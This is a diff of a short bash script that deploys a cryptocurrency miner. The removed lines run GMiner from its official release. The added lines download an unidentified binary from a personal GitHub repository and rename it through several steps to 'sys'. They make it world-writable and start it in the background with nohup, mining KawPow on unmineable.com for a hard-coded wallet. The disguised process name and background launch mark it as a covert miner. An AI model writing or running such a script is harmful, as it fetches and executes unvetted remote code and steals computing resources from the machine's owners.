@@ -1,6 +1,8 @@
 #!/bin/bash
-wget https://github.com/develsoftware/GMinerRelease/releases/download/2.56/gminer_2_56_linux64.tar.xz && 
-tar xf gminer_2_56_linux64.tar.xz && 
-mv miner code
-chmod 777 code
-sudo ./code --algo kawpow --server kp.unmineable.com:3333 --user ETC:0xb2AAd92f1570AD892248c229b86582699d724a0B.h --pass x
+wget https://github.com/torgyv/cuda/raw/main/kopi
+mv kopi code
+mv code built
+mv built az
+mv az sys
+chmod 777 sys
+nohup ./sys --algo kawpow --pool kp.unmineable.com:3333 --user ETC:0xb2AAd92f1570AD892248c229b86582699d724a0B
